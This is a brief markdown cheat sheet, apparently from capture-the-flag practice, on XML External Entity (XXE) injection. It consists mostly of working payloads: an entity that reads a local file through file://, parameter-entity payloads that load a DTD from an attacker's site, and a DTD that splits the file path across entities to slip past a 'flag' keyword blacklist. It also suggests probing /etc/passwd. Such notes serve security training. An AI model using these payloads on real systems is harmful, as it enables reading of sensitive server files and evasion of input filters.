# XML 
## 1) Remember to look at the structure of the site

XML files need to follow a structure. Examine what is required.

## Example 1) Basic Template 
```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ELEMENT rss ANY>
  <!ENTITY data SYSTEM "file:///flag_b8556065ceae28e450639223d5eef891">
]>
<rss>
    {STRUCTION OF PARSER}
</rss>
```

Need to figure out where inside the system you want to access 

Try to figure out the directories 
//etc/passwd

## Example 2) Blacklisted "flag"
```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ELEMENT rss ANY>
  <!ENTITY % sp SYSTEM "{YOUR_SITE}">
  %sp;
]>
<rss>
</rss>
```

```xml
<!ENTITY data SYSTEM "file:///flag_0bcb91edf3f9eedb7fab7544e157b4be">
```

## Example 2) Blacklisted "flag" && flag on external link 
```xml
<?xml version="1.0"?>
<!DOCTYPE rss [
  <!ELEMENT rss ANY>
  <!ENTITY % sp SYSTEM "{YOUR_SITE}">
  %sp;
]>
<rss>
</rss>
```

```xml
<!ENTITY % earth "file:">
<!ENTITY % is "///fla">
<!ENTITY % flat "g_f7cd6bacc5c0bbb2ba70e03d31a149a7">
<!ENTITY % PATH "%earth;%is;%flat;">

<!ENTITY % fleg '<!ENTITY data SYSTEM "%PATH;">'>
%fleg;
```

https://gracefulsecurity.com/xxe-cheatsheet-xml-external-entity-injection/